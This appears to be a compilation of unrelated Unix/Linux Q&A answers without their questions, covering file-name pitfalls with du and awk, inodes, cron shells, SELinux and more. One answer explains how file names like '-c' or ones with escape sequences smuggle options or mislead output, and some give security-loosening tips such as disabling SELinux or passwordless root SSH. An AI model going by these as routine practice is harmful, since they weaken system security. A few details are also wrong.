$ touch . /-c $'a\n12\tb ' foo $ du -hs * 0 a 12 b 0 foo 0 total as you can see , the -c file was taken as an option to du and is not reported ( and you see the total line because of du -c ) . also , the file called a\\n12\tb is making us think that there are files called a and b . $ du -hs -- * 0 a 12 b 0 -c 0 foo  that is better . at least this time -c is not taken as an option . $ du -hs ./* 0 ./a 12 b 0 ./-c 0 ./foo  that is even better . the ./ prefix prevents -c from being taken as an option and the absence of ./ before b in the output indicates that there is no b file in there , but there is a file with a newline character ( but see below 1 for further digressions on that ) . it is good practice to use the ./ prefix when possible , and if not and for arbitrary data , you should always use : cmd -- "$var"  or : cmd -- $patterns  if cmd does not support -- to mark the end of options , you should report it as a bug to its author ( except when it is by choice and documented like for echo ) . there are cases where ./* solves problems that -- does not . for instance : awk -f file.awk -- *  fails if there is a file called a=b.txt in the current directory ( sets the awk variable a to b.txt instead of telling it to process the file ) . awk -f file.awk ./*  does not have the problem because ./a is not a valid awk variable name , so ./a=b.txt is not taken as a variable assignment . cat -- * | wc -l  fails if there a file called - in the current directory , as that tells cat to read from its stdin ( - is special to most text processing utilities and to cd/pushd ) . cat ./* | wc -l  is ok because ./- is not special to cat . things like : grep -l foo -- *.txt | wc -l  to count the number of files that contain foo are wrong because it assumes file names do not contain newline characters ( wc -l counts the newline characters , those output by grep for each file and those in the filenames themselves ) . you should use instead : grep -l foo ./*.txt | grep -c /  ( counting the number of / characters is more reliable as there can only be one per filename ) . for recursive grep , the equivalent trick is to use : grep -rl foo .//. | grep -c //  ./* may have some unwanted side effects though . cat ./*  adds two more character per file , so would make you reach the limit of the maximum size of arguments+environment sooner . and sometimes you do not want that ./ to be reported in the output . like : grep foo ./*  would output : ./a.txt: foobar  instead of : a.txt: foobar  further digressions 1 . i feel like i have to expand on that here , following the discussion in comments . $ du -hs ./* 0 ./a 12 b 0 ./-c 0 ./foo  above , that ./ marking the beginning of each file means we can clearly identify where each filename starts ( at ./ ) and where it ends ( at the newline before the next ./ or the end of the output ) . what that means is that the output of du ./* , contrary to that of du -- * ) can be parsed reliably , albeit not that easily in a script . when the output goes to a terminal though , there are plenty more ways a filename may fool you : control characters , escape sequences can affect the way things are displayed . for instance , \r moves the cursor to the beginning of the line , \b moves the cursor back , \e[C forward ( in most terminals ) . . . many characters are invisible on a terminal starting with the most obvious one : the space character . there are unicode characters that look just the same as the slash in most fonts $ printf '\u002f \u2044 \u2215 \u2571 \u29F8\\n' / \u2044 \u2215 \u2571 \u29f8  ( see how it goes in your browser ) . an example : lots of x 's but y is missing . some tools like GNU ls would replace the non-printable characters with a question mark ( note that \u2215 ( u+2215 ) is printable though ) when the output goest to a terminal . gnu du does not . there are ways to make them reveal themselves : $ ls x x x?0?.\u2215x y y?0?.?[Cx y?x $ LC_ALL=C ls x x?0?.???x x y y?x y?0?.?[Cx  see how \u2215 turned to ??? after we told ls that our character set was ascii . $ du -hs ./* | LC_ALL=C sed -n l 0\t./x$ 0\t./x $ 0\t./x$ 0\t.\342\210\225x$ 0\t./y\r0\t.\033[Cx$ 0\t./y\bx$  $ marks the end of the line , so we can spot the "x" vs "x " , all non-printable characters and non-ascii characters are represented by a backslash sequence ( backslash itself would be represented with two backslashes ) which means it is unambiguous . that was gnu sed , it should be the same in all posix compliant sed implementations but note that some old sed implementations are not nearly as helpful . $ du -hs ./* | cat -vte 0^I./x$ 0^I./x $ 0^I./x$ 0^I.M-bM-^HM-^Ux$  ( not standard but pretty common , also cat -A with some implementations ) . that one is helpful and uses a different representation but is ambiguous ( "^I" and &lt;TAB&gt; are displayed the same for instance ) . that one is standard an unambiguous ( and consistent from implementation to implementation ) but not as easy to read . you will notice that y never showed up above . that is a completely unrelated issue with du -hs * that has nothing to do with file names but should be noted : because du reports disk usage , it does not report other links to a file already listed ( not all du implementations behave like that though when the hard links are listed on the command line ) .
according to the dtmf smbios documentation ( p . 97 of version 2.8.0 ) : maximum error ( as a percentage in the range 0 to 100 ) in the watt-hour data reported by the battery , indicating an upper bound on how much additional energy the battery might have above the energy it reports having so your dell battery seems to have been more exact in reporting ( or at least indicating it thought it was ) .
this looks like that your windows computer is infected with some kind of malware that creates the file automatically to all removable devices so that the malware can spread further . run a complete av scan in windows .
it is not called bash_profile , but the standard place for global bash configuration is /etc/bash.bashrc . it is usual to call this from /etc/profile if the shell is bash . for example , in my /etc/profile i have : in terms of usage , /etc/profile provides system-wide configuration for all bourne compatible shells ( sh , bash , ksh , etc . ) . there is normally no need for an equivalent /etc/bash_profile , because the intention of the profile file is to control behaviour for login shells . normally anything you want to do there is not going to be bash-specific . /etc/bash.bashrc is bash-specific , and will be run for both login and non-login shells . to further complicate things , it looks like os x does not even have an /etc/bash.bashrc . this is probably related to the fact that terminals in os x default to running as login shells , so the distinction is lost : an exception to the terminal window guidelines is mac os x’s terminal . app , which runs a login shell by default for each new terminal window , calling . bash_profile instead of . bashrc . other gui terminal emulators may do the same , but most tend not to . i do not run os x , so the extent of my knowledge ends there .
so , it seems that hp-ux tricked me : while mount show the file system as nfs , it was really a cifs one . and , since no username and password were provided when mounting it , authentication is done via cifslogin command . probably this command was already issued for root and bsp users , while it was never issue for oracle user . please note that cifslogin credential are stored in a cifsdb database . i think that on this server all credentials were stored years ago , and now everyone here was completely unaware of this mechanism .
the firmware must be present at the time you load the driver . so be sure to unload the module and reload it :  # &lt;install firmware&gt; rmmod bnx2 modprobe bnx2  for some drivers ( i do not know about this one ) , you may need to unload auxiliary modules that it is using . lsmod | grep bnx2 will show what modules bnx2 uses . call rmmod on all of them in reverse dependency order . most modules emit some log messages when they are loaded and they find a potential device , sometimes even if they do not find a potential device . these logs would be on /var/log/kern.log , at least on debian and ubuntu .
whether 64-bit is good or bad for performance depends a lot on the application . generally speaking : numerical computations ( integer or floating point ) are faster in 64 bits , and take about the same amount of memory . symbolic computations ( manipulating structured data ) are slower and can take twice as much memory in 64 bits . text manipulation is roughly the same ( a little slower and more memory-hungry in 64-bits ) . however these are only very rough guidelines , there are a lot of exceptions . windows guidelines tend to steer people away from a 64-bit operating system because there are more incompatible applications . linux was ready for amd64 earlier ; the few remaining incompatible applications are mostly closed-source and run fine as 32-bit executables on a 64-bit kernel with the appropriate 32-bit libraries . on linux , here are some guidelines : if you have specific applications that require or would benefit from 64 bits , you need a 64-bit kernel . note that you can have an amd64 kernel with an ix86 userland , but not the opposite . if these applications do not require many libraries , you could run an amd64 kernel with a 32-bit distribution . if you need more than 3gb of address space in a single process , it must be 64-bit . if you have 4gb of ram or more , get a 64-bit distribution . linux can use up to 64gb with a 32-bit kernel , but it needs to be pae-enabled ( most distributions include a pae kernel but it might not be the default one ) . if you have less than 1gb of ram , go 32-bit . from 1gb to 3gb , go either way , with a slight preference for 64-bit , but perhaps keeping a few applications 32-bit . ( for example , i measured more than twice the memory usage with an amd64 binary of firefox 3.0 than with an ix86 binary of the same version . i have not repeated the measures for later versions . )
the second option listed ( ~/ . config/fish/completions/pass . fish ) is the preferred approach . the third should also work . i tried the following : put the file at ~/.config/fish/completions/pass.fish type pass followed by a space hit tab and i see completions from that file . it is possible that fish is looking somewhere else . try echo $fish_complete_path and verify that it includes ~/ . config/fish/completions/ . if it does not , you can put back the defaults by erasing it and starting a new session : set -e fish_complete_path .
this is not the answer you are looking for , because i am going to try and dissuade you from this ( which is actually the only rational answer ) . on my raspberry i really do not need crons and pam logging and i want to have less i/o to make the sd card life a little longer . . if you think cron is truly doing excessive logging , then you should consider what cron is doing and how often , and tweak that . point being , if you do not care much about what it is doing , then why is it doing it ? wrt sd cards , logging is not significant enough to worry about . as in : totally insignificant , you are wasting your time thinking about it . sd cards use wear leveling to help preserve themselves : they do not suffer the effects of fragmentation ( i.e. . fragmentation is irrelevant to performance ) , and when you write to disk , the data is written to the least used part of the card , where ever that is . this transcends partition boundaries , so if you have a 2gb partition on a 16gb card , the partition is not limited to a 2gb wide block of physical addresses : it is a dynamic 2gb whose physical addresses will be a non-contiguous , ever-changing list encompassing the entire card . if your system writes a mb of logs a day ( you can check this by sending a copy of everything to one file , which is often what /var/log/syslog is ) , and you have a 4 gb card , it will take 4000 days before such a cycle has written to the entire card just once . the actual lifespan of an sd card might be as much as 100,000 write cycles [ but see comments ] . so all that logging will wear the card out in 4000 * 100000 / 365 = ~ 1 million years do you see now why reducing logging by 25% , or 50% , or even 99% , will be completely irrelevant ? even if the card has an incredibly bad lifespan in terms of write cycles -- say , 100 -- you will still get centuries of logging out of it . for a more in-depth test demonstration of this principle , see here . basically , all i want to log is fatals , hardware stuff , kernel/dmesg , and failed logins unless you enable " debug " level logging , by far the thing that will write the most to your logs is when something has gone really wrong , and generally those are going to go in as high priority unless you just disable logging entirely . for example , i doubt under normal circumstances that your pi , using the default raspbian config , writes 1 mb a day of logs , even if it is on 24/7 . let 's round it up to that . now say a defective kernel module writes the same 100 byte " emergency " panic message 50 times per second to syslog on an unattended system for one week : 100 * 50 * 60 * 60 * 24 * 7 = ~ 30 mb . consider that in relation to the aforementioned lifetime of the card , and the fact that you probably want to get the message . logging that haywire is very unusual , btw . logging is good . the logs are your friends . if you want to tinker with the rsyslog configuration , your time will be better spend adding more , not less .
ok , so you want to zip two iterables , or in other words you want a single loop , iterating over a bunch of strings , with an additional counter . it is quite easy to implement a counter . n=0 for x in $commands; do mv -- "$x" "$n.jpg" n=$(($n+1)) done  note that this only works if none of the elements that you are iterating over contains any whitespace ( nor globbing characters ) . if you have items separated by newlines , turn off globbing and split only on newlines . n=0 IFS=' '; set -f for x in $commands; do mv -- "$x" "$n.jpg" n=$(($n+1)) done set +f; unset IFS  if you only need to iterate over the data once , loop around read ( see why is while IFS= read used so often , instead of IFS=; while read.. ? for more explanations ) . n=0 while IFS= read -r x; do mv -- "$x" "$n.jpg" n=$(($n+1)) done &lt;&lt;EOF \u2026 EOF  if you are using a shell that has arrays ( bash , ksh or zsh ) , store the elements in an array . in zsh , either run setopt ksh_arrays to number array elements from 0 , or adapt the code for array element numbering starting at 1 . commands=( ./01/IMG0000.jpg \u2026 ) n=0 while [[ $n -lt ${#commands} ]]; do mv -- "${commands[$n]}" "$n.jpg" done 
you are probably using mawk , which has some optimisations that can result in errors like this when dealing with particularly large data . gawk will likely not have these issues when running it in the same way .
the error says that the file /home/elie/quicklisp/slime-helper.el does not exist . so , does it ? what do you see when you do ls /home/elie/quicklisp/slime-helper.el ? incidentally , you do not need expand-file-name in load .
it has an effect when you add reverse to the comparison . order of precedence are changed as in the -r only apply to last-resort comparison . no reverse : $ sort -k 1,2 sample A 34 A 33 $ sort -k 1,2b sample A 34 A 33  reverse : $ sort -rk 1,2 sample A 33 A 34 $ sort -rk 1,2b sample A 34 A 33 
not with chmod alone . you will need to use find: find some_dir -name '.?*' -prune -o -exec chmod 755 {} +  or with zsh ( or ksh93 -G , or with tcsh after set globstar ) globbing : chmod 755 -- some_dir some_dir/**/*  ( you can also do that with fish or bash -O globstar , but beware that bash versions prior to 4.3 and fish follow symlinks when descending directories ) are you sure you want to make all the files executable though ?
someone suggested in your hear cgroups . well , try to seek that direction as it can provide you with : applied to a group of task you choose ( thus not system wide but neither per process ) the limits are set for the group the limits are static they can enforce hard limit on memory and/or memory+swap something like that could bring you closer to your goals : group limited { memory { memory.limit_in_bytes = 50M; memory.memsw.limit_in_bytes = 50M; } }  this tells that the tasks under this cgroup can use at maximum 50m of memory only and 50m of memory+swap , so when the memory is full , it will not swap , but if the memory is not full and some data could be mapped in swap , this could be allowed . here is an excerpt from the cgroup 's memory documentation : by using memsw limit , you can avoid system oom which can be caused by swap shortage .
how do i connect to my linux-based servers ? ssh is the de facto standard way of managing linux-based servers . is there something similar to remote desktop ? yes , nx ( freenx , or nomachine nx ) works over ssh , it is very common in enterprise environments . also you can use vnc , or citrix , and rdp is also possible . do i need to use straight command line linux commands ? server administration is typically performed via cli , although there are gui , and web based management solutions ( webmin , ajenti etc ) . ultimately , obviously , i will need to upload my web files to my web server scp is your friend , if you manage your linux-based server from a windows environment , then winscp has a nice gui , or you can use pscp . i need to create a rest based service that will live on my database server , i know this is a very , very broad question , but where would i start with that ? indeed it is a very broad question , , how about reading a book like " restful java web services " ? is everything linux-based controlled from the command prompt ? not everything , many commercial linux-based routers have only web ui for example .
mysql seems to output the results to a shell variable in a single line . one way round this is to write the contents to a temporary file , then process in a while loop . edit on my system ifs="\n " before the mysql command ( when the results are assigned to a shell variable ) gives the correct multi-line output . e.g.  IFS="\\n" Total_results=$(mysql.....)  =============== end of edit ==========================
sed -e 's!&lt;E&gt; *!&lt;E&gt; !g' -e 's! *&lt;/E&gt;! &lt;/E&gt;!g'  ( note : i have used ! rather than # or / as my regular expression delimiter . personal preference . ) sed can be passed more than one command to run on its input , as long as each is prefixed with the -e flag . the * following the space in the regular expressions above means " match 0 or more space characters " . the re_format man page gives more information on such repetition : an atom followed by ' *' matches a sequence of 0 or more matches of the atom . an atom followed by ' +' matches a sequence of 1 or more matches of the atom . an atom followed by ' ?' matches a sequence of 0 or 1 matches of the atom . where an " atom " is the sub-pattern before the * , + , or ? . running this sed command on your examples :
change the domain to your ip address instead of bestia . also , according to wordpress support you can do that in the administration interface , in general -> settings . that is 4 years old , but there is also a more recent post on stack overflow that may be helpful .
functions are the general way to reduce code duplication . this case is not any different . you just need to to define a function to implement your while read logic .
the -T largefile flag adjusts the amount of inodes that are allocated at the creation of the file system . once allocated , their number cannot be adjusted ( at least for ext2/3 , not fully sure about ext4 ) . the default is one inode for every 16k of disk space . -T largefile makes it one inode for every megabyte . each file requires one inode . if you do not have any inodes left , you cannot create new files . but these statically allocated inodes take space , too . you can expect to save around 1,5 gigabytes for every 100 gb of disk by setting -T largefile , as opposed to the default . -T largefile4 ( one inode per 4 mb ) does not have such a dramatic effect . if you are certain that the average size of the files stored on the device will be above 1 megabyte , then by all means , set -T largefile . i am happily using it on my storage partitions , and think that it is not too radical of a setting . however , if you unpack a very large source tarball of many files ( think hundreds of thousands ) to that partition , you have a chance of running out of inodes for that partition . there is little you can do in that situation , apart from choosing another partition to untar to . you can check how many inodes you have available on a live filesystem with the dumpe2fs command : here , i can still create 34 thousand files . here 's what i got after doing mkfs.ext3 -T largefile -m 0 on a 100-gb partition : the largefile version has 102 400 inodes while the normal one created 6 553 600 inodes , and saved 1,5 gb in the process . if you have a good clue on what size files you are going to put on the file system , you can fine-tune the amount of inodes directly with the -i switch . it sets the bytes per inode ratio . you would gain 75% of the space savings if you used -i 65536 while still being able to create over a million files . i generally calculate to keep at least 100 000 inodes spare .
for linux , the linux standard base describes the filesystem layout and where and how applications and their data are installed . the lsb references the filesystem hierarchy standard ( even though it is terribly out of date ) for most items in the filesystem . as a practical matter , you will find that most applications have their program binaries installed in /usr/bin , their libraries installed in /usr/lib or /usr/lib64 , their shared application data in /usr/share and their machine-specific application data in /var/lib . these directories are where the system installs applications . user-installed applications may be placed under /usr/local , the conventions for which mirror those for /usr , or in directories under /opt which slightly resembles mac os x 's /Applications folder , in which each application has a folder directly underneath , and in that folder the directories typically mirror those found under /usr .
yes , you can do this by using symbolic notation in chmod: chmod -R go=u /path/to/directory  typically the mode specifiers following the operator consists of a combination of the letters rwxXst , each of which signifies the corresponding mode bit . however , the mode specifier may also consist of one of the letters ugo , in which case case the mode corresponds to the permissions currently granted to the owner ( u ) , member 's of the file 's group ( g ) or permissions of users in neither of the preceding categories ( o ) .
awk '{split(FILENAME,u,"/"); print u[2], $1}' users/*/info.txt 
if you run rpm -q --provides libcurl you can see what your libcurl package provides . if you run rpm -qp --requires synergy-1.4.16-r1969-Linux-x86_64.rpm you can see what your synergy rpm requires . the problem appears to be synergy was built against a libcurl package that provides libcurl.so.4(CURL_OPENSSL_3)(64bit) which the normal libcurl that comes with centos does not have . to resolve this you have got a few options find the libcurl rpm that provides libcurl.so.4(CURL_OPENSSL_3)(64bit) . i have not been able to find it with some quick searches . contact synergy and ask them about this . assuming you have all the other dependencies , you could install the rpm with nodeps ( rpm -ivh --nodeps synergy-1.4.16-r1969-Linux-x86_64.rpm ) and it will probably work fine . a few tips that will not solve your problem but will be useful to debug stuff you can do yum searches for libraries by doing yum whatprovides 'libcurl.so.4()(64bit)' you should use yum install or yum localinstall when installing standalone rpms since it will resolve dependencies for you . it would not have helped in this case but could in the future .
~/.config/mc/filehighlight.ini /etc/mc/filehighlight.ini  see the mc(1) man page , section Filenames Highlight
you can not directly install packages from one distribution onto another distribution . usually driver issues do not depend on the distribution , they depend on the kernel and driver versions . try to find a more recent kernel or drivers for debian . you can install debian in a chroot ( either on a separate partition or with debootstrap , and run it off the suse kernel . i have written a schroot and debootstrap guide for another purpose , but once you have a debootstrap binary on your suse installation and the schroot package installed , similar instructions should get you a running debian or ubuntu chroot .
what i am looking for is some way to get notification of changes on the file [ in proc ] you can not , because they are not files . this is not quite a duplicate question , but the answer here explains why . /proc is a kernel interface . there are no real files there , hence they can not change . reading from the handles is a request and the data in the file when you read it is a reply to that . the only way you could simulate something like this would be to read the file at intervals and compare the content to see if the reply from the kernel has changed -- looks like you have already done that . if you stat procfs files , the atime and the mtime will be the same : for some files it is whenever the stat call was , for others a time from during system boot . in the first case , it will always seem to have changed , in the second , it will never seem to have changed .
the “running” field in top does not show the number of tasks that are simultaneously running , it shows the number of tasks that are runnable , that is , the number of tasks that are contending for cpu access . if top could obtain all system information in a single time slice , the “running” field would be exactly the number of tasks whose status ( S column ) show R ( again , R here is often said to mean “running” , but this really means “runnable” as above ) . in practice , the number may not match because top obtains information for each task one by one and some of the runnable tasks may have fallen asleep or vice versa by the time it finishes . ( some implementations of top may just count tasks with the status R to compute the “running” field ; then the number will be exact . ) note that there is always a runnable task when top gather its information , namely top itself . if you see a single runnable task , it means no other process is contending for cpu time .
the /var/lib/mysql/aria_log_control file is open by another process and consequently , mysqld fails to start . check who/what is currently has the file open with : lsof `/var/lib/mysql/aria_log_control`  it should list the process ( es ) that has it open . COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME mysqld 1506 mysql 10uW REG 253,1 52 263948 /var/lib/mysql/aria_log_control  if the process definitely should not be running , then shut it down with : sudo kill -SIGTERM &lt;PID&gt;  if that fails : sudo kill -SIGKILL &lt;PID&gt;  or reboot .
awk $ some-command | awk '{print "Hi "$1" Bye"}'  sed $ some-command | sed 's/\(.*\)/Hi \1 Bye/'  examples using awk: $ echo -e "John\\nBob\\nLucy" | awk '{print "Hi "$1" Bye"}' Hi John Bye Hi Bob Bye Hi Lucy Bye  using sed: $ echo -e "John\\nBob\\nLucy" | sed 's/\(.*\)/Hi \1 Bye/' Hi John Bye Hi Bob Bye Hi Lucy Bye 
most versions of cron run commands using /bin/sh by default , and if the commands run any shell scripts ( that do not have a #! line to force use of a specific shell ) , /bin/sh will be used to run them , too . on some systems , /bin/sh is dash , a shell that does not understand the ansi-c quoting convention used by bash and other shells . so your $'\\n' string is probably getting interpreted as the 3-character string $\\n . most versions of cron will let you specify a shell to run your commands . you can have it use bash by editing your crontab to add a line SHELL=/bin/bash  that comes before any lines that schedule jobs . alternatively , you can make lorem.sh always use bash by adding #!/bin/bash  as its first line .
figured it out . i needed to add the disks which are going to be in the array inside the /etc/mdadm . conf file . now it is working as expected . edit : the actual contents of the mdadm . conf file is as below . earlier i had only this entry inside the /etc/mdadm.conf file . ARRAY /dev/md0 metadata=1.2 name=machine_name:0 UUID=XXXX:XXXX  however , i needed to mention which devices are actually in the array . so , i added the below entry inside the /etc/mdadm.conf file . DEVICE /dev/fioa /dev/fiob ARRAY /dev/md0 metadata=1.2 name=machine_name:0 UUID=XXXX:XXXX 
you must have the target key in the keyring . i am not sure whether it is necessary that the target key is valid ; better make it so . you should use a config directory on the stick . with this directory being empty you import the key : gpg --homedir /dir/on/stick --import /target/key.asc  this needs to be done just once . from your script you do this : gpg --homedir /dir/on/stick --trust-model always --recipient 0x12345678 \ --output /path/to/encrypted_file.gpg --encrypt /source/file  you may consider creating a signature for the file , too . but that would make the operation a bit more complicated .
you could use -I switch if you want to be prompted only once : rm -rI sampledir/  from man rm: and use -f for " no prompt": -f, --force ignore nonexistent files and arguments, never prompt  so : rm -rf sampledir/ 
this is a bug somewhere in the kernel . it is not directly related to rootfs/initramfs changes . it may be due to some other change you made ( did you use the same sources , the same configuration , the same compiler ? ) , or it may be related to some timing issue that revealed a latent bug . this warning comes from handle_irq_event_percpu and the interrupt handler is for the atmel mmc controller . there is probably a bug in that code . even if you do not observe any consequences other than the trace , this kind of warning tends to indicate serious problems , which could lead to corrupted data or at least to a lock-up . debugging is nontrivial . given that this is a fairly old kernel , check if more recent versions of this driver have had fixes that could be related , and consider using a more recent kernel if possible .
to symlink all css-files in a given directory into another simply do : $ cd /path/to/symlinkdir $ ln -s /path/to/orgdir/*.css .  if a file is already symlinked ( or otherwise existing ) , you will get a warning like ln: failed to create symbolic link '/path/to/orgdir/style_1374065326.css': File exists which you can safely ignore . if you want this to be fully automated , you might want to check inotify to monitor the source directory and run the symlink command whenever a .css is created therein .
from http://blog.chewearn.com/2008/12/18/rearrange-pdf-pages-with-pdftk/ pdftk A=src.pdf B=blank.pdf cat A1 B1 A2-end output res.pdf  hope you like this script , just save it as pdfInsertBlankPageAt.sh , add execute permissions , and run . ./pdfInsertBlankPageAt 5 src.pdf res.pdf cat A1 B1 A2-end means that the output file will contain the first page of document a ( src.pdf ) followed by the first page of document b ( blank.pdf ) followed by the rest ( pages 2 to end ) of document b . this operation is called concatenation , linux cat is very often used to display text , but it is interesting when used with more than one argument .
503 service unavailable means that the remote web site is down . try again in a few minutes .
there are at least two ways to do that : " poor man 's install": debian installation guide ( see installation media > hard disk , preparing files for hard disk booting ) or " bootstrap": debootstrap
you can also consider invoking your command under strace : strace -f -e trace=file -o /path/to/logfile your_command  logfile would contain every file-related operation performed by your_command or its child processes .
you are probably running into selinux issues . the directories on the flash drive probably are not labelled such that httpd_t can touch them . you can do a setenforce 0 ; service httpd restart and attempt to access again to confirm . if that is what is going on then you can either configure selinux to go into permissive mode ( last ditch " just trying to get it to work " solution ) or run a recursive restorecon on /var/www
it looks like you have built and installed monodevelop from source - did you do the same for the dependencies like gtksharp ? since banshee and tomboy are broken , it sounds like you have a dependency shared between the broken programs , and that is an obvious candidate . do cli mono apps work ? from the monodevelop build documentation : we strongly recommend you install everything from packages if possible . if not you , you should use a parallel mono environment . do not install anything to /usr or /usr/local unless you completely understand the implications of doing do . if the other mono applications will only run from the installed monodevelop tree , and reinstalling packages has not helped , you might have a mess of extra stuff floating around that the source install has added which is interfering with mono finding its libraries , possibly with hardcoded paths into the monodevelop install . my debian-fu is not strong , but there should be a way of identifying files in /usr that dpkg does not know about , that might be a place to start .
less works with screens of text . the " screen " is the full size of the terminal . less --window=n can tell less to only use so many rows at a time . that being said the option is not always available . see man less if you only want " some " output try tail -n 20 /file.txt for the last 20 lines , or i personally use head -n 20 | tail -n 10 to get the middle 10 lines .
the default directory ( /var/tmp ) for the vi editing buffer needs space equal to roughly twice the size of the file with which you are working , because vi uses the extra lines for buffer manipulation . if the /var/tmp directory does not have enough space for the editing buffer ( e . g . , you are working with a large file , or the system is running out of space some times you may get , you will receive the following error message like this also Not enough space in /var/tmp.  you can read about how to fix this here : http://kb.iu.edu/data/akqv.html
as the name implies , roughly a pager is a piece of software that helps the user get the output one page at a time , by getting the size of rows of the terminal and displaying that many lines .
method 1: to run the " df -h " command as root : su -c "df -h"  this will prompt the user for root password . method 2: alternatively , in /etc/sudoers find this line : root all= ( all ) all and duplicate it for your user johnsmith that you want to give admin privileges : johnsmith all= ( all ) all this way , johnsmith will be able to run any command requiring root rights , by first typing " sudo " in front of the command : sudo df -h  method 3: you can use ssh to execute a command on the same machine : ssh root@localhost "def -h"  will execute the same command in your server . if you do not want to be prompted for password , follow this tutorial for passwordless ssh : http://linuxproblem.org/art_9.html method 4: use gksudo ( graphical sudo ) : gksudo "gnome-open %u"  or , on kde kdesu: kdesu &lt;command&gt; 
based on some ideas from a few comments , i managed to cobble together a truly ugly hack that seems to work . the script becomes a bash script wraps a python script and passes it to a python interpreter via a " here document " . at the beginning : the python code goes here . then at the very end : # EOF  when the user runs the script , the most recent python version between 2.5 and 2.7 is used to interpret the rest of the script as a here document . an explanation on some shenanigans : the triple-quote stuff i have added also allows this same script to be imported as a python module ( which i use for testing purposes ) . when imported by python , everything between the first and second triple-single-quote is interpreted as a module-level string , and the third triple-single-quote is commented out . the rest is ordinary python . when run directly ( as a bash script now ) , the first two single-quotes become an empty string , and the third single-quote forms another string with the fourth single-quote , containing only a colon . this string is interpreted by bash as a no-op . everything else is bash syntax for globbing the python binaries in /usr/bin , selecting the last one , and running exec , passing the rest of the file as a here document . the here document starts with a python triple-single-quote containing only a hash/pound/octothorpe sign . the rest of the script then is interpreted as normal until the line reading '# eof ' terminates the here document . i feel like this is perverse , so i hope somebody has a better solution .
the string in xresources usually looks like this :  name.Class.resource: value  looks like you use * in place of name and class : *color0: black  which means you apply color to everything . if you want apply colors to urxvt only : URxvt*color0: black 
mdadm supports dealloc . commit=sec is the time , the filesystem syncs its data and metadata . setting this to 0 has the same effect as using the default value 5 . so i do not get the link between mdadm and commit=0 in your question ?
the first 16 colors have been standard for a long time ( and have mostly standard hues ) . 256 colors are a more recent extension defined by xterm and compatible terminals . the xterm documentation has this to say about colors 16–255: these specify the colors for the 256-color extension . the default resource values are for colors 16 through 231 to make a 6x6x6 color cube , and colors 232 through 255 to make a grayscale ramp . the colors can be changed from within the terminal ; see the ctlseqs file . for example print '\e]4;42;taupe\a' changes color 42 to be taupe ( the color names are available in /etc/X11/rgb.txt or some other distribution-dependent location ) . if you are content to assume that the colors above 16 have their default values , you could extend the $color array with names from rgb.txt . you will need to do a bit of arithmetic to find the closest approximation of 8-bit colors in lg ( 6 ) -bit colors .
sounds like you have got a format like &lt;number&gt;&lt;space&gt;&lt;field 1 name&gt;&lt;tab&gt;&lt;field 2 name&gt; , and you want to check that the input is sorted by field 1 name . if that is what you want , simply remove the initial number part and check the sorting of the remaining part of the first column : echo "$input" | sed -r 's/^ *[^ ]+ //' | sort -c -k1,1 
mv is the wrong tool for this job ; you want cp and then rm . since you are moving the file to another filesystem this is exactly what mv is doing behind the scenes anyway , except that mv is also trying to preserve file permission bits and owner/group information . this is because mv would preserve that information if it were moving a file within the same filesystem and mv tries to behave the same way in both situations . since you do not care about the preservation of file permission bits and owner/group information , do not use that tool . use cp --no-preserve=mode and rm instead .
ok , i fixed it by going to another computer with windows xp , plugging in a flash drive , installing lubuntu on it ( not a liveusb , a real install ) , then plugging it in the computer with the broken grub , turning it on , and typing : set prefix=(hd1,1)/grub set root=(hd1,1) insmod normal normal  then the grub menu of the lubuntu on the usb drive showed up , chose the windows xp entry ( that was created because i created the usb from a windows xp pc ) , and then i could reinstall lubuntu . now everything is working fine again .
you can mount the windows partition read-only . this will work even if it is hibernated ( but of course you cannot update files or write new ones ) . the reason you cannot mount the windows C: drive is that with fast-start windows 8 is actually hibernating automatically for you - but only the system session . from a linux point of view it is the same as if you hibernated yourself . if you want to mount it read-write you have to restart from windows , not shut down . shutting down hibernates the system image , but restarting does not .
you can perhaps use snmp , provided snmp is enabled/allowed for dhcp service on windows server . using snmp queries , one can build a statistics of the lease information from time to time remotely from the dhcp service . $snmp_address = "1.3.6.1.4.1.311.1.3.2.1.1.1"; $getsubnet = "snmpgetnext -v2c -c public -Oqv win_dhcp_server_ip $snmp_address |";  better description is at https://lists.isc.org/pipermail/bind-users/2004-november/054007.html
have you tried acpipowerbutton from this command set ? edit after reading the comments : you can use acpid or other acpi utilities to make it graceful . also , can you provide more information about how do you shutdown the machine at the moment ? plain shutdown would not wait for unfinished jobs , a time delay may be too long . i assume you are not using a window manager so try this tool . just seen this daemon . you might find it useful .
main advantages amd64 over i386 64-bit integer capability additional registers additional xmm ( sse ) registers larger physical address space in legacy mode sse/sse2 for more details look at wiki page . what about performance ? actually performance will grow up to 20-30% in general case . its mainly due to intelligent compilers that can optimize even non-optimized code for new architecture ( mainly due to sse/sse2 usage instead of fpu ) . ps . in 2009 phoronix made research about this issue . here it is . additional features in many tools now you can use arithmetic operations while it was too expensive in 32bit system . for example your ifconfig 's traffic counter will not reset after 4g level anymore itself ( except reboot ) . possible troubles the main problem is proprietary software . in case software developer spread their product only in binary for 32bit you may have a lot of problems . sometimes it is possible to find workaround . and hopefully in the gnu/linux world most of widely used software is open source .
you are probably importing the wrong os . py module . try starting python2.6 and then &gt;&gt;&gt; import os &gt;&gt;&gt; print os.__file__  that should be /usr/lib64/python2.6/os.py or /usr/lib64/python2.6/os.pyc . if it is not remove ( or rename ) the file that you found . if it is try : &gt;&gt;&gt; os.urandom(3)  this should give you a string of 3 characters . if it does , then gajim is finding the wrong os.py module . if you get the same error as when running gajim then look in the /usr/lib64/python2.6/os.py at the end urandom should be defined if it does not exist ( using the line if not _exists"urandom": ) . if it is not defined , as seems to be the case for python-2.6.5-2.5mdv2010.2.x86_64 , and /dev/urandom exists you could try to re-add the code : see also : this bug report
i know this is an old question , but i recently had the same problem , so i will provide a solution hoping it'll help someone out there . it is really easy - use the --force flag . duplicity --force file:///home/user/Backup /  this will probably not only restore missing files to the directories you have backed up , but also replace newer versions of backed up files if they exist , but it is better than nothing .
use a meta package ( e . g . linux-image-2.6-686 ) , depending on which you want to use . this is so that if the real package name changes ( which is very often ) , you will not lag behind . to determine which meta package to use , have a look at the name of the kernel package you are running . also , do read the package descriptions of the meta packages that seem like the right ones , just to make sure . supposing that you have updated your " /etc/sources . list " file ( instructions ) , run this ( as root ) : apt-get -t squeeze-backports install linux-image-2.6-686  once you have done that , there is no need to keep re-running the command to check if a newer package is available because your normal apt-get update &amp;&amp; apt-get upgrade will do the check for you and upgrade it . note that this behavior is new ( since squeeze ) , and in the older days , you had to apt pinning .
